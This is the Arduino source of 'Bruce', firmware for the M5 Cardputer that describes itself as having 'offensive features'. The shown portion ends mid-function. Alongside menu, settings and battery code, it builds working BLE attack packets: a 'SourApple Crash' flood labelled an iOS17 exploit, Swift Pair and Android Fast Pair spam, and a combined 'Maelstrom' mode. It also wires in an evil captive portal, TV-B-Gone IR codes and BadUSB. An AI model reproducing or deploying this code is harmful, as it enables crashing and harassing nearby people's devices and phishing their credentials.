/*
Bruce Firmware for m5-cardputer
github.com/pr3y
forked with some offensive features

Orignially:
Nemo Firmware for the M5 Stack Stick C Plus
github.com/n0xa | IG: @4x0nn

References:
github.com/n0xa/m5stick-nemo
github.com/spacehuhn/ArduinoPcap
github.com/m5stack/M5Cardputer
github.com/caioluders/DPWO
*/

// -=-=-=-=-=-=- Recomend to build for CARDPUTER only :P-=-=-=-=-=-=-
//#define STICK_C_PLUS
//#define STICK_C_PLUS2
//#define STICK_C
#define CARDPUTER


String buildver="0.4";
#define BGCOLOR BLACK
#define FGCOLOR PURPLE

// -=-=- EVIL Portal Language -=- Thanks, @marivaaldo! -=-=-
#define LANGUAGE_EN_US
//#define LANGUAGE_PT_BR

/*
#if defined(STICK_C_PLUS)
  #include <M5StickCPlus.h>
  // -=-=- Display -=-=-
  String platformName="StickC+";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define M5LED
  #define RTC
  #define AXP
  #define ACTIVE_LOW_IR
  #define ROTATION
  #define USE_EEPROM
  //#define SDCARD   //Requires a custom-built adapter
  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 9
  #define SPEAKER M5.Beep
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
#endif

#if defined(STICK_C_PLUS2)
  #include <M5StickCPlus2.h>
  // -=-=- Display -=-=-
  String platformName="StickC+2";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define ACTIVE_LOW_IR
  #define ROTATION
  #define USE_EEPROM  
  //#define RTC      //TODO: plus2 has a BM8563 RTC but the class isn't the same, needs work.  
  //#define SDCARD   //Requires a custom-built adapter
  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 19
  #define M5_BUTTON_MENU 35
  #define M5_BUTTON_HOME 37
  #define M5_BUTTON_RST 39
  //TODO: Figure out screen brightness on PLUS2 (if possible at all?) without AXP.
  #define BACKLIGHT 27 // best I can tell from the schematics?
  #define SPEAKER M5.Beep
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
#endif

#if defined(STICK_C)
  #include <M5StickC.h>
  // -=-=- Display -=-=-
  String platformName="StickC";
  #define BIG_TEXT 2
  #define MEDIUM_TEXT 2
  #define SMALL_TEXT 1
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define M5LED
  #define RTC
  #define AXP
  #define ROTATION
  #define USE_EEPROM
  //#define SDCARD   //Requires a custom-built adapter
  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 9
  #define SPEAKER M5.Beep
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
#endif
*/
#if defined(CARDPUTER)
  #include <M5Cardputer.h>
  // -=-=- Display -=-=-
  String platformName="Cardputer";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define KB
  #define HID
  #define ACTIVE_LOW_IR
  #define USE_EEPROM
  #define SDCARD
  // -=-=- ALIASES -=-=-
  #define DISP M5Cardputer.Display
  #define IRLED 44
  #define BACKLIGHT 38
  #define SPEAKER M5Cardputer.Speaker
  #define SD_CLK_PIN 40
  #define SD_MISO_PIN 39
  #define SD_MOSI_PIN 14
  #define SD_CS_PIN 12
  #define VBAT_PIN 10

#endif


// -=-=-=-=-=- LIST OF CURRENTLY DEFINED FEATURES -=-=-=-=-=-
// M5LED      - An LED exposed as M5_LED
// RTC        - Real-time clock exposed as M5.Rtc 
// AXP        - AXP192 Power Management exposed as M5.Axp
// KB         - Keyboard exposed as M5Cardputer.Keyboard
// HID        - HID exposed as USBHIDKeyboard
// USE_EEPROM - Store settings in EEPROM
// ROTATION   - Allow screen to be rotated
// DISP       - Set to the API's Display class
// SDCARD     - Device has an SD Card Reader attached 
// SPEAKER    - Aliased to the prefix used for making noise

/// SWITCHER ///
// Proc codes
// 0  - Clock
// 1  - Main Menu
// 2  - Settings Menu
// 3  - Clock set
// 4  - Dimmer Time adjustment
// 5  - TV B-GONE
// 6  - Battery info
// 7  - screen rotation
// 8  - AppleJuice Menu
// 9  - AppleJuice Advertisement
// 10 - Credits 
// 11 - Raw Sniffer
// 12 - Wifi tools menu
// 13 - TV-B-Gone Region Setting
// 14 - Wifi scanning
// 15 - Wifi scan results
// 16 - Bluetooth Spam Menu
// 17 - Bluetooth Maelstrom
// 18 - QR Codes
// 19 - EVIL Portal
// 20 - SSH
// 21 - Microphone
// 22 - DPWO-ESP32
// 23 - BadUSB(TODO)
// 24 - TELNET client(TODO)

#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "applejuice.h"
#include "WORLD_IR_CODES.h"
#include "sd.h"
#include "portal.h"
//#include "telnet.h"
#include "dpwo.h"
#include "sniffer.h"
#include "ssh.h"
#include "usb.h"
#include <BLEUtils.h>
#include <BLEServer.h>
//#include "WifiMgmtHdr.h"



int advtime = 0; 
int cursor = 0;
int wifict = 0;
int brightness = 100;
int ajDelay = 1000;
bool rstOverride = false;   // Reset Button Override. Set to true when navigating menus.
bool sourApple = false;     // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
bool swiftPair = false;     // Internal flag to place AppleJuice into Swift Pair random packet Mode
bool androidPair = false;   // Internal flag to place AppleJuice into Android Pair random packet Mode
bool maelstrom = false;     // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
bool portal_active = false; // Internal flag used to ensure NEMO Portal exits cleanly 
const byte PortalTickTimer = 1000;

#if defined(USE_EEPROM)
  #include <EEPROM.h>
  #define EEPROM_SIZE 4
#endif

struct MENU {
  char name[19];
  int command;
};

struct QRCODE {
  char name[19];
  String url;
};

QRCODE qrcodes[] = {
  { "Back", "" },
  { "Boitatech", "https://discord.com/boitatech"},
  
};

bool isSwitching = true;
#if defined(RTC)
  int current_proc = 0; // Start in Clock Mode
#else
  int current_proc = 1; // Start in Main Menu mode if no RTC
#endif

void drawmenu(MENU thismenu[], int size) {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 5, 1);
  // scrolling menu
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < size ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(thismenu[i].name);
    }
  } else {
    for (
      int i = 0 ; i < size ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(thismenu[i].name);
    }
  }
}

void number_drawmenu(int nums) {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 5, 1);
  // scrolling menu
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < nums ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(i);
    }
  } else {
    for (
      int i = 0 ; i < nums ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(i);
    }
  }
}

void switcher_button_proc() {
  if (rstOverride == false) {
    if (check_next_press()) {
      isSwitching = true;
      current_proc = 1;
    }
  }
}

// Tap the power button from pretty much anywhere to get to the main menu
void check_menu_press() {
#if defined(AXP)
  if (M5.Axp.GetBtnPress()) {
#endif
#if defined(KB)
  if (M5Cardputer.Keyboard.isKeyPressed(',') || M5Cardputer.Keyboard.isKeyPressed('`')){
#endif
#if defined(M5_BUTTON_MENU)
  if (digitalRead(M5_BUTTON_MENU) == LOW){
#endif
    dimtimer();
    if(portal_active){
      // just in case we escape the portal with the main menu button
      shutdownWebServer();
      portal_active = false;
    }
    isSwitching = true;
    rstOverride = false;
    current_proc = 1;
    delay(100);
  }
}

bool check_next_press(){
#if defined(KB)
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(';')){
    // hack to handle the up arrow
    cursor = cursor - 2;
    dimtimer();
    return true;
  }
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')){
    dimtimer();
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_RST) == LOW){
    dimtimer();
    return true;
  }
#endif
  return false;
}

bool check_select_press(){
#if defined(KB)
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')){
    dimtimer();
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_HOME) == LOW){
    dimtimer();
    return true;
  }
#endif
  return false;
}

/// MAIN MENU ///
MENU mmenu[] = {
  { "IR", 13}, // We jump to the region menu first
  { "Bluetooth", 16},
  { "WiFi", 12},
  { "QR Codes", 18},
  { "BadUSB", 23},
  { "Microphone", 21},
  { "Settings", 2},
};
int mmenu_size = sizeof(mmenu) / sizeof(MENU);

void mmenu_setup() {
  cursor = 0;
  rstOverride = true;
  drawmenu(mmenu, mmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void mmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % mmenu_size;
    drawmenu(mmenu, mmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    rstOverride = false;
    isSwitching = true;
    current_proc = mmenu[cursor].command;
  }
}

//Screen dimming needs both AXP and RTC features
bool screen_dim_dimmed = false;
int screen_dim_time = 30;
int screen_dim_current = 0;

void screenBrightness(int bright){
  #if defined(AXP)
    M5.Axp.ScreenBreath(bright);
  #endif
  #if defined(BACKLIGHT)
    analogWrite(BACKLIGHT, 155 + (bright));
  #endif
}

int uptime(){
  return(int(millis() / 1000));
}

void dimtimer(){
  if(screen_dim_dimmed){
    screenBrightness(brightness);
    screen_dim_dimmed = false;
  }
  screen_dim_current = uptime() + screen_dim_time + 2;
}

void screen_dim_proc() {
  if(screen_dim_time > 0){
    check_menu_press();
    check_next_press();
    check_select_press();
    if (screen_dim_dimmed == false) {
      if (uptime() == screen_dim_current || (uptime() + 1) == screen_dim_current || (uptime() + 2) == screen_dim_current) {
        screenBrightness(10);
        screen_dim_dimmed = true;
      }
    }
  }
}

/// Dimmer MENU ///
MENU dmenu[] = {
  { "Back", screen_dim_time},
  { "Never", 0},
  { "5 seconds", 5},
  { "10 seconds", 10},
  { "15 seconds", 15},
  { "30 seconds", 30},
  { "1 minute", 60},
  { "2 minutes", 120},
  { "4 minutes", 240},
};
int dmenu_size = sizeof(dmenu) / sizeof(MENU);

void dmenu_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 5, 1);
  DISP.println("SET AUTO DIM TIME");
  delay(1000);
  cursor = 0;
  rstOverride = true;
  drawmenu(dmenu, dmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void dmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % dmenu_size;
    drawmenu(dmenu, dmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    screen_dim_time = dmenu[cursor].command;
    #if defined(USE_EEPROM)
      EEPROM.write(1, screen_dim_time);
      EEPROM.commit();
    #endif
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 5, 1);
    DISP.println("SET BRIGHTNESS");
    delay(1000);
    cursor = brightness / 10;
    number_drawmenu(11);
    while( !check_select_press()) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % 11 ;
        number_drawmenu(11);
        screenBrightness(10 * cursor);
        delay(250);
       }
    }
    screenBrightness(10 * cursor);
    #if defined(USE_EEPROM)
      EEPROM.write(2, 10 * cursor);
      EEPROM.commit();
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 2;
  }
}

/// SETTINGS MENU ///
MENU smenu[] = {
  { "Back", 1},

  { "Battery Info", 6},

  { "Brightness", 4},
#if defined(RTC)
  { "Set Clock", 3},
#endif
#if defined(ROTATION)
  { "Rotation", 7},
#endif
  { "About", 10},
#if defined(USE_EEPROM)
  { "Clear Settings", 99},
#endif
};
int smenu_size = sizeof(smenu) / sizeof (MENU);

void smenu_setup() {
  cursor = 0;
  rstOverride = true;
  drawmenu(smenu, smenu_size);
  delay(500); // Prevent switching after menu loads up
}

void clearSettings(){
  #if defined(USE_EEPROM)
  EEPROM.write(0, 255); // Rotation
  EEPROM.write(1, 255); // dim time
  EEPROM.write(2, 255); // brightness
  EEPROM.write(3, 255); // TV-B-Gone Region
  EEPROM.commit();
  #endif
  ESP.restart();
}

void smenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % smenu_size;
    drawmenu(smenu, smenu_size);
    delay(250);
  }
  if (check_select_press()) {
    rstOverride = false;
    isSwitching = true;
    if(smenu[cursor].command == 99){
      clearSettings();
    }
    current_proc = smenu[cursor].command;
  }
}

int rotation = 1;
#if defined(ROTATION)
  /// Rotation MENU ///
  MENU rmenu[] = {
    { "Back", rotation},
    { "Right", 1},
    { "Left", 3},
  };
  int rmenu_size = sizeof(rmenu) / sizeof (MENU);

  void rmenu_setup() {
    cursor = 0;
    rstOverride = true;
    drawmenu(rmenu, rmenu_size);
    delay(500); // Prevent switching after menu loads up
  }

  void rmenu_loop() {
    if (check_next_press()) {
      cursor++;
      cursor = cursor % rmenu_size;
      drawmenu(rmenu, rmenu_size);
      delay(250);
    }
    if (check_select_press()) {
      rstOverride = false;
      isSwitching = true;
      rotation = rmenu[cursor].command;
      DISP.setRotation(rotation);
      #if defined(USE_EEPROM)
        EEPROM.write(0, rotation);
        EEPROM.commit();
      #endif
      current_proc = 2;
    }
  }
#endif //ROTATION

  /// BATTERY INFO ///
  int oldbattery=0;
  void battery_drawmenu(int battery) {
    DISP.setTextSize(SMALL_TEXT);
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 8, 1);
    DISP.print("Battery level: ");
    DISP.print(battery);
    DISP.println("%");
  }

  void battery_setup() { // 
    rstOverride = false;
    pinMode(VBAT_PIN, INPUT);
    int battery = ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738); // 
    int bat_ = analogRead(VBAT_PIN);
    Serial.println("Battery level: ");
    
    Serial.println(battery);
    battery_drawmenu(battery);
    delay(500); // Prevent switching after menu loads up
    /*
      Used minimum 3,0V and maximum 4,2V for battery. So it may show wrong values. Needs testing.
      It only shows decent values when disconnected from charger, due to HW limitations.
      Equation: Bat% = ((Vadc - 1842) / (2580 - 1842)) * 100. Where: 4,2V = 2580, 3,0V = 1842.
    */
  }

  void battery_loop() {
    delay(300);
    int battery = ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
    if (battery != oldbattery){
      Serial.println("Battery level:");
      Serial.println(battery);
      Serial.printf("Raw: %d\n", analogRead(VBAT_PIN));
      battery_drawmenu(battery);
    }
    if (check_select_press()) {
      rstOverride = false;
      isSwitching = true;
     current_proc = 1;
    }
    oldbattery = battery;
  }

/// TV-B-GONE ///
void tvbgone_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(SMALL_TEXT);
  irsend.begin();
  // Hack: Set IRLED high to turn it off after setup. Otherwise it stays on (active low)
  digitalWrite(IRLED, HIGH);

  delay_ten_us(5000);
  if(region == NA) {
    DISP.print("Region:\nAmericas / Asia\n");
  }
  else {
    DISP.println("Region: EMEA");
  }
  DISP.println("Select: Go/Pause");
  DISP.println("Next: Exit");
  delay(1000);
}

void tvbgone_loop()
{
  if (check_select_press()) {
    delay(250);
    Serial.println("triggered TVBG");
    sendAllCodes();
  }
}

/// TVBG-Region MENU ///
MENU tvbgmenu[] = {
  { "Back", 3},
  { "Americas / Asia", 0},
  { "EU/MidEast/Africa", 1},
};
int tvbgmenu_size = sizeof(tvbgmenu) / sizeof (MENU);

void tvbgmenu_setup() {  
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.println("Region");
  cursor = region % 2;
  rstOverride = true;
  delay(1000); 
  drawmenu(tvbgmenu, tvbgmenu_size);
}

void tvbgmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % tvbgmenu_size;
    drawmenu(tvbgmenu, tvbgmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    region = tvbgmenu[cursor].command;

    if (region == 3) {
      current_proc = 1;
      isSwitching = true;
      rstOverride = false; 
      return;
    }

    #if defined(USE_EEPROM)
      EEPROM.write(3, region);
      EEPROM.commit();
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 5;
  }
}

void sendAllCodes() {
  bool endingEarly = false; //will be set to true if the user presses the button during code-sending
  if (region == NA) {
    num_codes = num_NAcodes;
  } else {
    num_codes = num_EUcodes;
  }
  for (i = 0 ; i < num_codes; i++)
  {
    if (region == NA) {
      powerCode = NApowerCodes[i];
    }
    else {
      powerCode = EUpowerCodes[i];
    }
    const uint8_t freq = powerCode->timer_val;
    const uint8_t numpairs = powerCode->numpairs;
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(BIG_TEXT);
    DISP.setCursor(5, 1);
    DISP.println("TV-B-Gone");
    DISP.setTextSize(SMALL_TEXT);
    DISP.println("Front Key: Go/Pause");
    const uint8_t bitcompression = powerCode->bitcompression;
    code_ptr = 0;
    for (uint8_t k = 0; k < numpairs; k++) {
      uint16_t ti;
      ti = (read_bits(bitcompression)) * 2;
      #if defined(ACTIVE_LOW_IR)
        offtime = powerCode->times[ti];  // read word 1 - ontime
        ontime = powerCode->times[ti + 1]; // read word 2 - offtime
      #else
        ontime = powerCode->times[ti];  // read word 1 - ontime
        offtime = powerCode->times[ti + 1]; // read word 2 - offtime      
      #endif
      DISP.setTextSize(TINY_TEXT);
      DISP.printf("rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
      Serial.printf("TVBG: rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
      rawData[k * 2] = offtime * 10;
      rawData[(k * 2) + 1] = ontime * 10;
    }
    irsend.sendRaw(rawData, (numpairs * 2) , freq);
    #if defined(ACTIVE_LOW_IR)
      // Set Active Low IRLED high to turn it off after each burst.
      digitalWrite(IRLED, HIGH);
    #endif
    bitsleft_r = 0;
    delay_ten_us(20500);
    #if defined(AXP)
    if (M5.Axp.GetBtnPress()) {
      endingEarly = true;
      current_proc = 1;
      isSwitching = true;
      rstOverride = false; 
      break;     
    }
    #endif
#if defined(KB)
#endif
    if (check_select_press()){
      Serial.println("endingearly");
      endingEarly = true;
      delay(250);
      break; 
    }
  } 
  if (endingEarly == false)
  {
    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
    quickflashLEDx(8);
  }
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(SMALL_TEXT);
  DISP.println("Select: Go/Pause");
  DISP.println("Next: Exit");
}

/// CLOCK ///
/// TIMESET ///

#if defined(RTC)
  void clock_setup() {
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(MEDIUM_TEXT);
  }

  void clock_loop() {
    M5.Rtc.GetBm8563Time();
    DISP.setCursor(40, 40, 2);
    DISP.printf("%02d:%02d:%02d\n", M5.Rtc.Hour, M5.Rtc.Minute, M5.Rtc.Second);
    delay(250);
  }

  /// TIME SETTING ///
  void timeset_setup() {
    rstOverride = true;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 5, 1);
    DISP.println("SET HOUR");
    delay(2000);
  }

  void timeset_loop() {
    M5.Rtc.GetBm8563Time();
    cursor = M5.Rtc.Hour;
    number_drawmenu(24);
    while(digitalRead(M5_BUTTON_HOME) == HIGH) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % 24 ;
        number_drawmenu(24);
        delay(100);
      }
    }
    int hour = cursor;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 5, 1);
    DISP.println("SET MINUTE");
    delay(2000);
    cursor = M5.Rtc.Minute;
    number_drawmenu(60);
    while(digitalRead(M5_BUTTON_HOME) == HIGH) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % 60 ;
        number_drawmenu(60);
        delay(100);
      }
    }
    int minute = cursor;
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 5, 1);
    RTC_TimeTypeDef TimeStruct;
    TimeStruct.Hours   = hour;
    TimeStruct.Minutes = minute;
    TimeStruct.Seconds = 0;
    M5.Rtc.SetTime(&TimeStruct);
    DISP.printf("Setting Time:\n%02d:%02d:00",hour,minute);
    delay(2000);
    rstOverride = false;
    isSwitching = true;
    current_proc = 0;
  }
#endif // RTC

/// Bluetooth Spamming ///
/// BTSPAM MENU ///
MENU btmenu[] = {
  { "Back", 5},
  { "AppleJuice", 0},
  { "Swift Pair", 1},
  { "Android Spam", 4},
  { "SourApple Crash", 2},
  { "BT Maelstrom", 3},
};
int btmenu_size = sizeof(btmenu) / sizeof (MENU);

void btmenu_setup() {
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  androidPair = false;
  rstOverride = true;
  drawmenu(btmenu, btmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void btmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % btmenu_size;
    drawmenu(btmenu, btmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    int option = btmenu[cursor].command;
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(MEDIUM_TEXT);
    DISP.setCursor(5, 1);
    DISP.println("BT Spam");
    DISP.setTextSize(SMALL_TEXT);
    DISP.print("Advertising:\n");

    switch(option) {
      case 0:
        DISP.fillScreen(BGCOLOR);
        rstOverride = false;
        isSwitching = true;
        current_proc = 8;
        break;
      case 1:
        swiftPair = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print("Swift Pair Random");
        DISP.print("\n\nNext: Exit");
        break;
      case 2:
        sourApple = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print("SourApple Crash");
        DISP.print("\n\nNext: Exit");
        break;
      case 3:
        rstOverride = false;
        isSwitching = true;
        current_proc = 17; // Maelstrom
        DISP.print("Bluetooth Maelstrom\n");
        DISP.print(" Combined BT Spam");
        DISP.print("\n\nNext: Exit");
        break;
      case 4:
        androidPair = true;
        current_proc = 9; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print("Android Spam");
        DISP.print("\n\nNext: Exit");
        break;

      case 5:
        DISP.fillScreen(BGCOLOR);
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
    }
  }
}

MENU ajmenu[] = {
  { "Back", 29},
  { "AirPods", 1},
  { "Transfer Number", 27},
  { "AirPods Pro", 2},
  { "AirPods Max", 3},
  { "AirPods G2", 4},
  { "AirPods G3", 5},
  { "AirPods Pro G2", 6},
  { "PowerBeats", 7},
  { "PowerBeats Pro", 8},
  { "Beats Solo Pro", 9},
  { "Beats Studio Buds", 10},
  { "Beats Flex", 11},
  { "Beats X", 12},
  { "Beats Solo 3", 13},
  { "Beats Studio 3", 14},
  { "Beats Studio Pro", 15},
  { "Beats Fit Pro", 16},
  { "Beats Studio Buds+", 17},
  { "AppleTV Setup", 18},
  { "AppleTV Pair", 19},
  { "AppleTV New User", 20},
  { "AppleTV AppleID", 21},
  { "AppleTV Audio", 22},
  { "AppleTV HomeKit", 23},
  { "AppleTV Keyboard", 24},
  { "AppleTV Network", 25},
  { "TV Color Balance", 26},
  { "Setup New Phone", 28},
};
int ajmenu_size = sizeof(ajmenu) / sizeof (MENU);

void aj_setup(){
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("AppleJuice");
  delay(1000);  
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  rstOverride = true;
  drawmenu(ajmenu, ajmenu_size);
}

void aj_loop(){
  if (!maelstrom){
    if (check_next_press()) {
      cursor++;
      cursor = cursor % ajmenu_size;
      drawmenu(ajmenu, ajmenu_size);
      delay(100);
    }
  }
  if (check_select_press() || maelstrom) {
    deviceType = ajmenu[cursor].command;
    if (maelstrom) {
      deviceType = random(1, 28);
    }
    switch(deviceType) {
      case 1:
        data = Airpods;
        break;
      case 2:
        data = AirpodsPro;
        break;
      case 3:
        data = AirpodsMax;
        break;
      case 4:
        data = AirpodsGen2;
        break;
      case 5:
        data = AirpodsGen3;
        break;
      case 6:
        data = AirpodsProGen2;
        break;
      case 7:
        data = PowerBeats;
        break;
      case 8:
        data = PowerBeatsPro;
        break;
      case 9:
        data = BeatsSoloPro;
        break;
      case 10:
        data = BeatsStudioBuds;
        break;
      case 11:
        data = BeatsFlex;
        break;
      case 12:
        data = BeatsX;
        break;
      case 13:
        data = BeatsSolo3;
        break;
      case 14:
        data = BeatsStudio3;
        break;
      case 15:
        data = BeatsStudioPro;
        break;
      case 16:
        data = BeatsFitPro;
        break;
      case 17:
        data = BeatsStudioBudsPlus;
        break;
      case 18:
        data = AppleTVSetup;
        break;
      case 19:
        data = AppleTVPair;
        break;
      case 20:
        data = AppleTVNewUser;
        break;
      case 21:
        data = AppleTVAppleIDSetup;
        break;
      case 22:
        data = AppleTVWirelessAudioSync;
        break;
      case 23:
        data = AppleTVHomekitSetup;
        break;
      case 24:
        data = AppleTVKeyboard;
        break;
      case 25:
        data = AppleTVConnectingToNetwork;
        break;
      case 26:
        data = TVColorBalance;
        break;
      case 27:
        data = TransferNumber;
        break;
      case 28:
        data = SetupNewPhone;
        break;
      case 29:
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
    }
    if (current_proc == 8 && isSwitching == false){
      DISP.fillScreen(BGCOLOR);
      DISP.setTextSize(MEDIUM_TEXT);
      DISP.setCursor(5, 1);
      DISP.println("AppleJuice");
      DISP.setTextSize(SMALL_TEXT);
      DISP.print("Advertising:\n");
      DISP.print(ajmenu[cursor].name);
      DISP.print("\n\nNext: Exit");
      isSwitching = true;
      current_proc = 9; // Jump over to the AppleJuice BLE beacon loop
    }
  }
}

void aj_adv_setup(){
  rstOverride = false;  
}

void aj_adv(){
  // run the advertising loop
  // Isolating this to its own process lets us take advantage 
  // of the background stuff easier (menu button, dimmer, etc)
  rstOverride = true;
  if (sourApple || swiftPair || androidPair || maelstrom){
    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
    advtime = 0; // bypass ajDelay counter
  }
  if (millis() > advtime + ajDelay){
    advtime = millis();
    pAdvertising->stop(); // This is placed here mostly for timing.
                          // It allows the BLE beacon to run through the loop.
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    if (sourApple){
      Serial.print("SourApple Advertisement: ");
      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
      // Original credits for algorithm ECTO-1A & WillyJL
      uint8_t packet[17];
      uint8_t size = 17;
      uint8_t i = 0;
      packet[i++] = size - 1;    // Packet Length
      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
      packet[i++] = 0x00;        // ...
      packet[i++] = 0x0F;  // Type
      packet[i++] = 0x05;                        // Length
      packet[i++] = 0xC1;                        // Action Flags
      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
      packet[i++] = types[rand() % sizeof(types)];  // Action Type
      esp_fill_random(&packet[i], 3); // Authentication Tag
      i += 3;
      packet[i++] = 0x00;  // ???
      packet[i++] = 0x00;  // ???
      packet[i++] =  0x10;  // Type ???
      esp_fill_random(&packet[i], 3);
      oAdvertisementData.addData(std::string((char *)packet, 17));
      for (int i = 0; i < sizeof packet; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");
    } else if (swiftPair) {
      const char* display_name = generateRandomName();
      Serial.printf("SwiftPair Advertisement: '%s' - ", display_name);
      uint8_t display_name_len = strlen(display_name);
      uint8_t size = 7 + display_name_len;
      uint8_t* packet = (uint8_t*)malloc(size);
      uint8_t i = 0;
      packet[i++] = size - 1; // Size
      packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
      packet[i++] = 0x06; // Company ID (Microsoft)
      packet[i++] = 0x00; // ...
      packet[i++] = 0x03; // Microsoft Beacon ID
      packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
      packet[i++] = 0x80; // Reserved RSSI Byte
      for (int j = 0; j < display_name_len; j++) {
        packet[i + j] = display_name[j];
      }
      for (int i = 0; i < size; i ++) {
        Serial.printf("%02x", packet[i]);
      }
      Serial.println("");

      i += display_name_len;  
      oAdvertisementData.addData(std::string((char *)packet, size));
      free(packet);
      free((void*)display_name);
    } else if (androidPair) {
      Serial.print("Android Spam Advertisement: ");
      uint8_t packet[14];
      uint8_t i = 0;
      packet[i++] = 3;  // Packet Length
      packet[i++] = 0x03; // AD Type (Service UUID List)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      packet[i++] = 6; // Size
      packet[i++] = 0x16; // AD Type (Service Data)
      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
      packet[i++] = 0xFE; // ...
      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
      packet[i++] = (model >> 0x10) & 0xFF;
      packet[i++] = (model >> 0x08) & 0xFF;
      packet[i++] = (model >> 0x00) & 0xFF;
